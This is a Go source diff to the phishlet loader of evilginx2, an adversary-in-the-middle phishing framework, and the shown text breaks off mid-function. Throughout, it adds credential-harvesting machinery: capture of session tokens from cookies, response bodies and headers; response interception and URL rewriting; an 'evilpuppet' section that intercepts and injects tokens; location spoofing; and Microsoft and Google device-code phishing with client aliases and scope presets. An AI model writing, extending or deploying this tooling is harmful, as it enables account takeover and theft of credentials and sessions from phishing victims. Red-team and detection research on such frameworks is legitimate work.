@@ -1,15 +1,16 @@
 package core
 
 import (
-	"encoding/base64"
 	"fmt"
-	"net/url"
 	"regexp"
 	"strconv"
 	"strings"
 
+	"github.com/kgretzky/evilginx2/log"
 	"github.com/spf13/viper"
 )
+
+var AUTH_TOKEN_TYPES = []string{"cookie", "body", "http"}
 
 type ProxyHost struct {
 	phish_subdomain string
@@ -18,6 +19,13 @@ type ProxyHost struct {
 	handle_session  bool
 	is_landing      bool
 	auto_filter     bool
+}
+
+// ProxyHostInfo is an exported struct for external access to proxy host info
+type ProxyHostInfo struct {
+	PhishSub string
+	OrigSub  string
+	Domain   string
 }
 
 type SubFilter struct {
@@ -30,13 +38,27 @@ type SubFilter struct {
 	with_params   []string
 }
 
-type AuthToken struct {
+type CookieAuthToken struct {
+	domain    string
 	name      string
 	re        *regexp.Regexp
 	http_only bool
 	optional  bool
-	secure    bool
-	host_only bool
+	always    bool
+}
+
+type BodyAuthToken struct {
+	domain string
+	path   *regexp.Regexp
+	name   string
+	search *regexp.Regexp
+}
+
+type HttpAuthToken struct {
+	domain string
+	path   *regexp.Regexp
+	name   string
+	header string
 }
 
 type PhishletVersion struct {
@@ -75,30 +97,57 @@ type LoginUrl struct {
 }
 
 type JsInject struct {
+	id              string           `mapstructure:"id"`
 	trigger_domains []string         `mapstructure:"trigger_domains"`
 	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
 	trigger_params  []string         `mapstructure:"trigger_params"`
 	script          string           `mapstructure:"script"`
 }
 
+type Intercept struct {
+	domain      string         `mapstructure:"domain"`
+	path        *regexp.Regexp `mapstructure:"path"`
+	http_status int            `mapstructure:"http_status"`
+	body        string         `mapstructure:"body"`
+	mime        string         `mapstructure:"mime"`
+}
+
 type Phishlet struct {
-	Site         string
-	Name         string
-	Author       string
-	Version      PhishletVersion
-	proxyHosts   []ProxyHost
-	domains      []string
-	subfilters   map[string][]SubFilter
-	authTokens   map[string][]*AuthToken
-	authUrls     []*regexp.Regexp
-	username     PostField
-	password     PostField
-	landing_path []string
-	cfg          *Config
-	custom       []PostField
-	forcePost    []ForcePost
-	login        LoginUrl
-	js_inject    []JsInject
+	Name             string
+	ParentName       string
+	Path             string
+	Author           string
+	Version          PhishletVersion
+	RedirectUrl      string
+	minVersion       string
+	proxyHosts       []ProxyHost
+	domains          []string
+	subfilters       map[string][]SubFilter
+	cookieAuthTokens map[string][]*CookieAuthToken
+	bodyAuthTokens   map[string]*BodyAuthToken
+	httpAuthTokens   map[string]*HttpAuthToken
+	authUrls         []*regexp.Regexp
+	username         PostField
+	password         PostField
+	landing_path     []string
+	cfg              *Config
+	custom           []PostField
+	forcePost        []ForcePost
+	login            LoginUrl
+	js_inject        []JsInject
+	intercept        []Intercept
+	customParams     map[string]string
+	isTemplate       bool
+	rewriteUrls      []RewriteUrl
+	evilPuppet       *EvilPuppetConfig
+	deviceCodeConfig *PhishletDeviceCodeConfig
+	SpoofLocation    bool
+}
+
+type ConfigParam struct {
+	Name     string  `mapstructure:"name"`
+	Default  *string `mapstructure:"default"`
+	Required *bool   `mapstructure:"required"`
 }
 
 type ConfigProxyHost struct {
@@ -122,8 +171,13 @@ type ConfigSubFilter struct {
 }
 
 type ConfigAuthToken struct {
-	Domain string   `mapstructure:"domain"`
-	Keys   []string `mapstructure:"keys"`
+	Domain *string   `mapstructure:"domain"`
+	Keys   *[]string `mapstructure:"keys"`
+	Type   *string   `mapstructure:"type"`
+	Path   *string   `mapstructure:"path"`
+	Name   *string   `mapstructure:"name"`
+	Search *string   `mapstructure:"search"`
+	Header *string   `mapstructure:"header"`
 }
 
 type ConfigPostField struct {
@@ -167,27 +221,127 @@ type ConfigJsInject struct {
 	Script         *string   `mapstructure:"script"`
 }
 
-type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
+type ConfigIntercept struct {
+	Domain     *string `mapstructure:"domain"`
+	Path       *string `mapstructure:"path"`
+	HttpStatus *int    `mapstructure:"http_status"`
+	Body       *string `mapstructure:"body"`
+	Mime       *string `mapstructure:"mime"`
 }
 
-func NewPhishlet(site, path string, cfg *Config) (*Phishlet, error) {
+type RewriteUrlTrigger struct {
+	Domains []string `mapstructure:"domains"`
+	Paths   []string `mapstructure:"paths"`
+}
+
+type RewriteUrlQuery struct {
+	Key   string `mapstructure:"key"`
+	Value string `mapstructure:"value"`
+}
+
+type RewriteUrlRewrite struct {
+	Path        string            `mapstructure:"path"`
+	Query       []RewriteUrlQuery `mapstructure:"query"`
+	ExcludeKeys []string          `mapstructure:"exclude_keys"`
+}
+
+type ConfigRewriteUrl struct {
+	Trigger RewriteUrlTrigger `mapstructure:"trigger"`
+	Rewrite RewriteUrlRewrite `mapstructure:"rewrite"`
+}
+
+type RewriteUrl struct {
+	triggerDomains []string
+	triggerPaths   []string
+	rewritePath    string
+	rewriteQuery   []RewriteUrlQuery
+	excludeKeys    []string
+}
+
+type ConfigEvilPuppetTrigger struct {
+	Domains     *[]string `mapstructure:"domains"`
+	Paths       *[]string `mapstructure:"paths"`
+	ContentType *string   `mapstructure:"content_type"`
+}
+
+type ConfigEvilPuppetAction struct {
+	Type     *string `mapstructure:"type"`
+	Selector *string `mapstructure:"selector"`
+	Value    *string `mapstructure:"value"`
+}
+
+type ConfigEvilPuppetInterceptor struct {
+	Domain     *string `mapstructure:"domain"`
+	Path       *string `mapstructure:"path"`
+	TokenName  *string `mapstructure:"token_name"`
+	Source     *string `mapstructure:"source"`
+	Search     *string `mapstructure:"search"`
+	HeaderName *string `mapstructure:"header_name"`
+}
+
+type ConfigEvilPuppetInjectToken struct {
+	TokenName *string `mapstructure:"token_name"`
+	Target    *string `mapstructure:"target"`
+	Search    *string `mapstructure:"search"`
+	Replace   *string `mapstructure:"replace"`
+}
+
+type ConfigEvilPuppet struct {
+	Triggers     *[]ConfigEvilPuppetTrigger     `mapstructure:"triggers"`
+	Actions      *[]ConfigEvilPuppetAction      `mapstructure:"actions"`
+	Interceptors *[]ConfigEvilPuppetInterceptor `mapstructure:"interceptors"`
+	StartURL     *string                        `mapstructure:"start_url"`
+	Timeout      *int                           `mapstructure:"timeout"`
+	HoldRequest  *bool                          `mapstructure:"hold_request"`
+	InjectToken  *[]ConfigEvilPuppetInjectToken `mapstructure:"inject_token"`
+}
+
+// ConfigDeviceCode represents the device_code section in phishlet YAML
+type ConfigDeviceCode struct {
+	Provider *string `mapstructure:"provider"` // microsoft or google
+	Client   *string `mapstructure:"client"`   // OAuth client alias (e.g., ms_office, google_cloud_sdk)
+	Scope    *string `mapstructure:"scope"`    // Scope preset (e.g., full, gmail, gworkspace)
+	Mode     *string `mapstructure:"mode"`     // Default mode: off, always, fallback, auto
+	Template *string `mapstructure:"template"` // Interstitial template: success, fallback, compliance
+}
+
+// PhishletDeviceCodeConfig holds runtime device code configuration from phishlet YAML
+type PhishletDeviceCodeConfig struct {
+	Provider string
+	Client   string
+	Scope    string
+	Mode     string
+	Template string
+}
+
+// Add to ConfigPhishlet struct:
+type ConfigPhishlet struct {
+	Name          string              `mapstructure:"name"`
+	RedirectUrl   string              `mapstructure:"redirect_url"`
+	Params        *[]ConfigParam      `mapstructure:"params"`
+	ProxyHosts    *[]ConfigProxyHost  `mapstructure:"proxy_hosts"`
+	SubFilters    *[]ConfigSubFilter  `mapstructure:"sub_filters"`
+	AuthTokens    *[]ConfigAuthToken  `mapstructure:"auth_tokens"`
+	AuthUrls      []string            `mapstructure:"auth_urls"`
+	Credentials   *ConfigCredentials  `mapstructure:"credentials"`
+	ForcePosts    *[]ConfigForcePost  `mapstructure:"force_post"`
+	LandingPath   *[]string           `mapstructure:"landing_path"`
+	LoginItem     *ConfigLogin        `mapstructure:"login"`
+	JsInject      *[]ConfigJsInject   `mapstructure:"js_inject"`
+	Intercept     *[]ConfigIntercept  `mapstructure:"intercept"`
+	RewriteUrls   *[]ConfigRewriteUrl `mapstructure:"rewrite_urls"`
+	EvilPuppet    *ConfigEvilPuppet   `mapstructure:"evilpuppet"`
+	DeviceCode    *ConfigDeviceCode   `mapstructure:"device_code"`
+	SpoofLocation *bool               `mapstructure:"spoof_location"`
+}
+
+func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
 	p := &Phishlet{
-		Site: site,
-		cfg:  cfg,
+		cfg: cfg,
 	}
 	p.Clear()
 
-	err := p.LoadFromFile(site, path)
+	err := p.LoadFromFile(site, path, customParams)
 	if err != nil {
 		return nil, err
 	}
@@ -196,11 +350,14 @@ func NewPhishlet(site, path string, cfg *Config) (*Phishlet, error) {
 
 func (p *Phishlet) Clear() {
 	p.Name = ""
+	p.ParentName = ""
 	p.Author = ""
 	p.proxyHosts = []ProxyHost{}
 	p.domains = []string{}
 	p.subfilters = make(map[string][]SubFilter)
-	p.authTokens = make(map[string][]*AuthToken)
+	p.cookieAuthTokens = make(map[string][]*CookieAuthToken)
+	p.bodyAuthTokens = make(map[string]*BodyAuthToken)
+	p.httpAuthTokens = make(map[string]*HttpAuthToken)
 	p.authUrls = []*regexp.Regexp{}
 	p.username.key = nil
 	p.username.search = nil
@@ -208,9 +365,15 @@ func (p *Phishlet) Clear() {
 	p.password.search = nil
 	p.custom = []PostField{}
 	p.forcePost = []ForcePost{}
+	p.customParams = make(map[string]string)
+	p.isTemplate = false
+	p.rewriteUrls = []RewriteUrl{}
+	p.evilPuppet = nil
+	p.deviceCodeConfig = nil
+	p.SpoofLocation = false
 }
 
-func (p *Phishlet) LoadFromFile(site, path string) error {
+func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
 	p.Clear()
 
 	c := viper.New()
@@ -223,7 +386,10 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 	}
 
 	p.Name = site
+	p.Path = path
+	p.ParentName = ""
 	p.Author = c.GetString("author")
+	p.RedirectUrl = c.GetString("redirect_url")
 	p.Version, err = p.parseVersion(c.GetString("min_ver"))
 	if err != nil {
 		return err
@@ -254,11 +420,79 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 		return err
 	}
 
+	if fp.Params != nil {
+		if len(*fp.Params) > 0 {
+			p.isTemplate = true
+		}
+		if customParams != nil {
+			prequired := make(map[string]string)
+			pall := make(map[string]string)
+			params := make(map[string]string)
+			for _, param := range *fp.Params {
+				val := ""
+				if param.Default != nil {
+					val = *param.Default
+				}
+				params[param.Name] = val
+				pall[param.Name] = val
+
+				if param.Required != nil && *param.Required == true {
+					prequired[param.Name] = val
+				}
+			}
+			for k, v := range *customParams {
+				if _, ok := pall[k]; !ok {
+					log.Warning("phishlets: [%s] incorrect parameter key specified: %s", site, k)
+					delete(*customParams, k)
+					continue
+				}
+				params[k] = v
+				delete(prequired, k)
+			}
+			if len(prequired) > 0 {
+				return fmt.Errorf("missing custom parameter values during initalization: %v", prequired)
+			}
+			p.isTemplate = false
+			p.customParams = params
+		} else {
+			// Check if any params are required (have no default)
+			hasRequired := false
+			for _, param := range *fp.Params {
+				if param.Required != nil && *param.Required {
+					hasRequired = true
+					break
+				}
+			}
+
+			for _, param := range *fp.Params {
+				val := ""
+				if param.Required != nil && *param.Required {
+					val += "(required)"
+				} else if param.Default != nil {
+					val = *param.Default
+				}
+
+				p.customParams[param.Name] = val
+			}
+
+			// If all params have defaults (none required), treat as normal phishlet
+			if !hasRequired {
+				p.isTemplate = false
+			}
+		}
+
+		/*
+			if customParams != nil {
+				p.customParams = *customParams
+			} else {
+				for _, param := range *fp.Params {
+					p.customParams[param.Name] = param.Default
+				}
+			}*/
+	}
+
 	if fp.ProxyHosts == nil {
 		return fmt.Errorf("missing `proxy_hosts` section")
-	}
-	if fp.SubFilters == nil {
-		return fmt.Errorf("missing `sub_filters` section")
 	}
 	if fp.AuthTokens == nil {
 		return fmt.Errorf("missing `auth_tokens` section")
@@ -290,7 +524,7 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 		if ph.AutoFilter != nil {
 			auto_filter = *ph.AutoFilter
 		}
-		p.addProxyHost(*ph.PhishSub, *ph.OrigSub, *ph.Domain, ph.Session, ph.IsLanding, auto_filter)
+		p.addProxyHost(p.paramVal(*ph.PhishSub), p.paramVal(*ph.OrigSub), p.paramVal(*ph.Domain), ph.Session, ph.IsLanding, auto_filter)
 	}
 	if len(p.proxyHosts) == 0 {
 		return fmt.Errorf("proxy_hosts: list cannot be empty")
@@ -316,29 +550,35 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 		p.proxyHosts[0].is_landing = true
 	}
 
-	for _, sf := range *fp.SubFilters {
-		if sf.Hostname == nil {
-			return fmt.Errorf("sub_filters: missing `triggers_on` field")
+	if fp.SubFilters != nil {
+		for _, sf := range *fp.SubFilters {
+			if sf.Hostname == nil {
+				return fmt.Errorf("sub_filters: missing `triggers_on` field")
+			}
+			if sf.Sub == nil {
+				return fmt.Errorf("sub_filters: missing `orig_sub` field")
+			}
+			if sf.Domain == nil {
+				return fmt.Errorf("sub_filters: missing `domain` field")
+			}
+			if sf.Mimes == nil {
+				return fmt.Errorf("sub_filters: missing `mimes` field")
+			}
+			if sf.Search == nil {
+				return fmt.Errorf("sub_filters: missing `search` field")
+			}
+			if sf.Replace == nil {
+				return fmt.Errorf("sub_filters: missing `replace` field")
+			}
+			if sf.WithParams == nil {
+				sf.WithParams = &[]string{}
+			}
+
+			for n := range *sf.Mimes {
+				(*sf.Mimes)[n] = p.paramVal((*sf.Mimes)[n])
+			}
+			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
 		}
-		if sf.Sub == nil {
-			return fmt.Errorf("sub_filters: missing `orig_sub` field")
-		}
-		if sf.Domain == nil {
-			return fmt.Errorf("sub_filters: missing `domain` field")
-		}
-		if sf.Mimes == nil {
-			return fmt.Errorf("sub_filters: missing `mimes` field")
-		}
-		if sf.Search == nil {
-			return fmt.Errorf("sub_filters: missing `search` field")
-		}
-		if sf.Replace == nil {
-			return fmt.Errorf("sub_filters: missing `replace` field")
-		}
-		if sf.WithParams == nil {
-			sf.WithParams = &[]string{}
-		}
-		p.addSubFilter(*sf.Hostname, *sf.Sub, *sf.Domain, *sf.Mimes, *sf.Search, *sf.Replace, sf.RedirectOnly, *sf.WithParams)
 	}
 	if fp.JsInject != nil {
 		for _, js := range *fp.JsInject {
@@ -351,20 +591,114 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 			if js.Script == nil {
 				return fmt.Errorf("js_inject: missing `script` field")
 			}
-			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, *js.Script)
+			for n := range *js.TriggerDomains {
+				(*js.TriggerDomains)[n] = p.paramVal((*js.TriggerDomains)[n])
+			}
+			for n := range *js.TriggerPaths {
+				(*js.TriggerPaths)[n] = p.paramVal((*js.TriggerPaths)[n])
+			}
+			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script))
+			if err != nil {
+				return err
+			}
+		}
+	}
+	if fp.Intercept != nil {
+		for _, ic := range *fp.Intercept {
+			var err error
+			var body, mime string
+			if ic.Domain == nil {
+				return fmt.Errorf("intercept: missing `domain` field")
+			}
+			if *ic.Domain == "" {
+				return fmt.Errorf("intercept: `domain` field cannot be empty")
+			}
+			if ic.Path == nil {
+				return fmt.Errorf("intercept: missing `path` field")
+			}
+			path_re, err := regexp.Compile(*ic.Path)
+			if err != nil {
+				return fmt.Errorf("intercept: `path` invalid regular expression: %v", err)
+			}
+			if ic.HttpStatus == nil {
+				return fmt.Errorf("intercept: missing `http_status` field")
+			}
+			if ic.Body != nil {
+				body = *ic.Body
+			}
+			if ic.Mime != nil {
+				mime = *ic.Mime
+			}
+			err = p.addIntercept(*ic.Domain, path_re, *ic.HttpStatus, body, mime)
 			if err != nil {
 				return err
 			}
 		}
 	}
 	for _, at := range *fp.AuthTokens {
-		err := p.addAuthTokens(at.Domain, at.Keys)
-		if err != nil {
-			return err
+		ttype := "cookie"
+		if at.Type != nil {
+			ttype = *at.Type
+		}
+		if !stringExists(ttype, AUTH_TOKEN_TYPES) {
+			return fmt.Errorf("auth_tokens: invalid token type: %s", ttype)
+		}
+		switch ttype {
+		case "cookie":
+			if at.Domain == nil {
+				return fmt.Errorf("auth_tokens: 'domain' not found for cookie auth token")
+			}
+			if at.Keys == nil {
+				return fmt.Errorf("auth_tokens: 'keys' not found for cookie auth token")
+			}
+
+			for n := range *at.Keys {
+				(*at.Keys)[n] = p.paramVal((*at.Keys)[n])
+			}
+			err := p.addCookieAuthTokens(p.paramVal(*at.Domain), *at.Keys)
+			if err != nil {
+				return err
+			}
+		case "body":
+			if at.Domain == nil {
+				return fmt.Errorf("auth_tokens: 'domain' not found for body auth token")
+			}
+			if at.Path == nil {
+				return fmt.Errorf("auth_tokens: 'path' not found for body auth token")
+			}
+			if at.Name == nil {
+				return fmt.Errorf("auth_tokens: 'name' not found for body auth token")
+			}
+			if at.Search == nil {
+				return fmt.Errorf("auth_tokens: 'search' not found for body auth token")
+			}
+
+			err := p.addBodyAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Search))
+			if err != nil {
+				return err
+			}
+		case "http":
+			if at.Domain == nil {
+				return fmt.Errorf("auth_tokens: 'domain' not found for http auth token")
+			}
+			if at.Path == nil {
+				return fmt.Errorf("auth_tokens: 'path' not found for http auth token")
+			}
+			if at.Name == nil {
+				return fmt.Errorf("auth_tokens: 'name' not found for http auth token")
+			}
+			if at.Header == nil {
+				return fmt.Errorf("auth_tokens: 'header' not found for http auth token")
+			}
+
+			err := p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header))
+			if err != nil {
+				return err
+			}
 		}
 	}
 	for _, au := range fp.AuthUrls {
-		re, err := regexp.Compile(au)
+		re, err := regexp.Compile(p.paramVal(au))
 		if err != nil {
 			return err
 		}
@@ -384,22 +718,22 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 		return fmt.Errorf("credentials: missing password `search` field")
 	}
 
-	p.username.key, err = regexp.Compile(*fp.Credentials.Username.Key)
+	p.username.key, err = regexp.Compile(p.paramVal(*fp.Credentials.Username.Key))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
 
-	p.username.search, err = regexp.Compile(*fp.Credentials.Username.Search)
+	p.username.search, err = regexp.Compile(p.paramVal(*fp.Credentials.Username.Search))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
 
-	p.password.key, err = regexp.Compile(*fp.Credentials.Password.Key)
+	p.password.key, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Key))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
 
-	p.password.search, err = regexp.Compile(*fp.Credentials.Password.Search)
+	p.password.search, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Search))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
@@ -412,8 +746,8 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 	if p.password.tp == "" {
 		p.password.tp = "post"
 	}
-	p.username.key_s = *fp.Credentials.Username.Key
-	p.password.key_s = *fp.Credentials.Password.Key
+	p.username.key_s = p.paramVal(*fp.Credentials.Username.Key)
+	p.password.key_s = p.paramVal(*fp.Credentials.Password.Key)
 
 	if fp.LoginItem.Domain == nil {
 		return fmt.Errorf("login: missing `domain` field")
@@ -421,7 +755,7 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 	if fp.LoginItem.Path == nil {
 		return fmt.Errorf("login: missing `path` field")
 	}
-	p.login.domain = *fp.LoginItem.Domain
+	p.login.domain = p.paramVal(*fp.LoginItem.Domain)
 	if p.login.domain == "" {
 		return fmt.Errorf("login: `domain` field cannot be empty")
 	}
@@ -441,7 +775,7 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 		return fmt.Errorf("login: `domain` must contain a value of one of the hostnames (`orig_subdomain` + `domain`) defined in `proxy_hosts` section")
 	}
 
-	p.login.path = *fp.LoginItem.Path
+	p.login.path = p.paramVal(*fp.LoginItem.Path)
 	if p.login.path == "" {
 		p.login.path = "/"
 	}
@@ -459,11 +793,11 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 				return fmt.Errorf("credentials: missing custom `search` field")
 			}
 			o := PostField{}
-			o.key, err = regexp.Compile(*cp.Key)
+			o.key, err = regexp.Compile(p.paramVal(*cp.Key))
 			if err != nil {
 				return fmt.Errorf("credentials: %v", err)
 			}
-			o.search, err = regexp.Compile(*cp.Search)
+			o.search, err = regexp.Compile(p.paramVal(*cp.Search))
 			if err != nil {
 				return err
 			}
@@ -471,7 +805,7 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 			if o.tp == "" {
 				o.tp = "post"
 			}
-			o.key_s = *cp.Key
+			o.key_s = p.paramVal(*cp.Key)
 			p.custom = append(p.custom, o)
 		}
 	}
@@ -490,7 +824,7 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 			}
 
 			fpf := ForcePost{}
-			fpf.path, err = regexp.Compile(*op.Path)
+			fpf.path, err = regexp.Compile(p.paramVal(*op.Path))
 			if err != nil {
 				return err
 			}
@@ -506,11 +840,11 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 					}
 
 					f_s := ForcePostSearch{}
-					f_s.key, err = regexp.Compile(*op_s.Key)
+					f_s.key, err = regexp.Compile(p.paramVal(*op_s.Key))
 					if err != nil {
 						return err
 					}
-					f_s.search, err = regexp.Compile(*op_s.Search)
+					f_s.search, err = regexp.Compile(p.paramVal(*op_s.Search))
 					if err != nil {
 						return err
 					}
@@ -526,8 +860,8 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 				}
 
 				f_f := ForcePostForce{
-					key:   *op_f.Key,
-					value: *op_f.Value,
+					key:   p.paramVal(*op_f.Key),
+					value: p.paramVal(*op_f.Value),
 				}
 				fpf.force = append(fpf.force, f_f)
 			}
@@ -537,60 +871,250 @@ func (p *Phishlet) LoadFromFile(site, path string) error {
 
 	if fp.LandingPath != nil {
 		p.landing_path = *fp.LandingPath
+		for n := range p.landing_path {
+			p.landing_path[n] = p.paramVal(p.landing_path[n])
+		}
 	}
+	if fp.RewriteUrls != nil {
+		for _, ru := range *fp.RewriteUrls {
+			// Apply paramVal to trigger domains and paths
+			domains := make([]string, len(ru.Trigger.Domains))
+			for i, d := range ru.Trigger.Domains {
+				domains[i] = p.paramVal(d)
+			}
+			paths := make([]string, len(ru.Trigger.Paths))
+			for i, pt := range ru.Trigger.Paths {
+				paths[i] = p.paramVal(pt)
+			}
+			r := RewriteUrl{
+				triggerDomains: domains,
+				triggerPaths:   paths,
+				rewritePath:    p.paramVal(ru.Rewrite.Path),
+				rewriteQuery:   ru.Rewrite.Query,
+				excludeKeys:    ru.Rewrite.ExcludeKeys,
+			}
+			p.rewriteUrls = append(p.rewriteUrls, r)
+		}
+	}
+
+	// Parse spoof_location
+	if fp.SpoofLocation != nil && *fp.SpoofLocation {
+		p.SpoofLocation = true
+		log.Info("[phishlet:%s] location spoofing enabled", p.Name)
+	}
+
+	// Parse evilpuppet section
+	if fp.EvilPuppet != nil {
+		epc := &EvilPuppetConfig{
+			Enabled: true,
+			Timeout: 30,
+		}
+		log.Debug("[phishlet:%s] Parsing evilpuppet section", p.Name)
+		if fp.EvilPuppet.StartURL != nil {
+			epc.StartURL = p.paramVal(*fp.EvilPuppet.StartURL)
+		}
+		if fp.EvilPuppet.Timeout != nil {
+			epc.Timeout = *fp.EvilPuppet.Timeout
+		}
+		if fp.EvilPuppet.Triggers != nil {
+			log.Debug("[phishlet:%s] Found %d evilpuppet triggers", p.Name, len(*fp.EvilPuppet.Triggers))
+			for i, t := range *fp.EvilPuppet.Triggers {
+				trigger := EvilPuppetTrigger{}
+				if t.Domains != nil {
+					trigger.Domains = *t.Domains
+					log.Debug("[phishlet:%s] Trigger[%d] domains loaded: %v", p.Name, i, trigger.Domains)
+				}
+				if t.Paths != nil {
+					for _, pathStr := range *t.Paths {
+						re, err := regexp.Compile(p.paramVal(pathStr))
+						if err != nil {
+							return fmt.Errorf("evilpuppet: invalid trigger path regex: %s - %v", pathStr, err)
+						}
+						trigger.Paths = append(trigger.Paths, re)
+						log.Debug("[phishlet:%s] Trigger[%d] path regex: %s", p.Name, i, pathStr)
+					}
+				}
+				if t.ContentType != nil {
+					trigger.ContentType = *t.ContentType
+				}
+				epc.Triggers = append(epc.Triggers, trigger)
+			}
+		}
+		if fp.EvilPuppet.Actions != nil {
+			for _, a := range *fp.EvilPuppet.Actions {
+				action := EvilPuppetAction{}
+				if a.Type != nil {
+					action.Type = *a.Type
+				}
+				if a.Selector != nil {
+					action.Selector = p.paramVal(*a.Selector)
+				}
+				if a.Value != nil {
+					action.Value = p.paramVal(*a.Value)
+				}
+				epc.Actions = append(epc.Actions, action)
+			}
+		}
+		if fp.EvilPuppet.Interceptors != nil {
+			for _, ic := range *fp.EvilPuppet.Interceptors {
+				interceptor := EvilPuppetInterceptor{}
+				if ic.Domain != nil {
+					interceptor.Domain = p.paramVal(*ic.Domain)
+				}
+				if ic.Path != nil {
+					re, err := regexp.Compile(p.paramVal(*ic.Path))
+					if err != nil {
+						return fmt.Errorf("evilpuppet: invalid interceptor path regex: %s - %v", *ic.Path, err)
+					}
+					interceptor.Path = re
+				}
+				if ic.TokenName != nil {
+					interceptor.TokenName = *ic.TokenName
+				}
+				if ic.Source != nil {
+					interceptor.Source = *ic.Source
+				}
+				if ic.Search != nil {
+					re, err := regexp.Compile(*ic.Search)
+					if err != nil {
+						return fmt.Errorf("evilpuppet: invalid interceptor search regex: %s - %v", *ic.Search, err)
+					}
+					interceptor.Search = re
+				}
+				if ic.HeaderName != nil {
+					interceptor.HeaderName = *ic.HeaderName
+				}
+				epc.Interceptors = append(epc.Interceptors, interceptor)
+			}
+		}
+		if fp.EvilPuppet.HoldRequest != nil {
+			epc.HoldRequest = *fp.EvilPuppet.HoldRequest
+		}
+		if fp.EvilPuppet.InjectToken != nil {
+			for _, it := range *fp.EvilPuppet.InjectToken {
+				injToken := EvilPuppetInjectToken{}
+				if it.TokenName != nil {
+					injToken.TokenName = *it.TokenName
+				}
+				if it.Target != nil {
+					injToken.Target = *it.Target
+				}
+				if it.Search != nil {
+					re, err := regexp.Compile(*it.Search)
+					if err != nil {
+						return fmt.Errorf("evilpuppet: invalid inject_token search regex: %s - %v", *it.Search, err)
+					}
+					injToken.Search = re
+				}
+				if it.Replace != nil {
+					injToken.Replace = *it.Replace
+				}
+				epc.InjectTokens = append(epc.InjectTokens, injToken)
+			}
+		}
+		p.evilPuppet = epc
+	}
+
+	// Parse device_code section
+	if fp.DeviceCode != nil {
+		dcc := &PhishletDeviceCodeConfig{}
+		log.Debug("[phishlet:%s] Parsing device_code section", p.Name)
+
+		if fp.DeviceCode.Provider != nil {
+			provider := strings.ToLower(*fp.DeviceCode.Provider)
+			if provider != DCProviderMicrosoft && provider != DCProviderGoogle {
+				return fmt.Errorf("device_code: invalid provider '%s' - must be 'microsoft' or 'google'", provider)
+			}
+			dcc.Provider = provider
+		}
+
+		if fp.DeviceCode.Client != nil {
+			client := *fp.DeviceCode.Client
+			// Validate client alias exists
+			if _, ok := KnownClientIDs[client]; !ok {
+				log.Warning("[phishlet:%s] device_code: unknown client alias '%s' - will be validated at runtime", p.Name, client)
+			}
+			dcc.Client = client
+		}
+
+		if fp.DeviceCode.Scope != nil {
+			dcc.Scope = *fp.DeviceCode.Scope
+		}
+
+		if fp.DeviceCode.Mode != nil {
+			mode := strings.ToLower(*fp.DeviceCode.Mode)
+			if mode != DCModeOff && mode != DCModeAlways && mode != DCModeFallback && mode != DCModeAuto && mode != DCModeDirect {
+				return fmt.Errorf("device_code: invalid mode '%s' - must be 'off', 'always', 'fallback', 'auto', or 'direct'", mode)
+			}
+			dcc.Mode = mode
+		}
+
+		if fp.DeviceCode.Template != nil {
+			dcc.Template = *fp.DeviceCode.Template
+		}
+
+		p.deviceCodeConfig = dcc
+		log.Info("[phishlet:%s] device_code: provider=%s client=%s scope=%s mode=%s", p.Name, dcc.Provider, dcc.Client, dcc.Scope, dcc.Mode)
+	}
+
 	return nil
 }
 
-func (p *Phishlet) GetPhishHosts() []string {
+// GetEvilPuppetConfig returns the evilpuppet configuration for this phishlet
+func (p *Phishlet) GetEvilPuppetConfig() *EvilPuppetConfig {
+	return p.evilPuppet
+}
+
+// GetDeviceCodeConfig returns the device code configuration for this phishlet
+func (p *Phishlet) GetDeviceCodeConfig() *PhishletDeviceCodeConfig {
+	return p.deviceCodeConfig
+}
+
+func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 	var ret []string
-	for _, h := range p.proxyHosts {
-		phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
-		if ok {
+	phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
+	if ok {
+		if !use_wildcards {
+			for _, h := range p.proxyHosts {
+				ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
+			}
+		} else {
+			ret = []string{"*." + phishDomain}
+		}
+	}
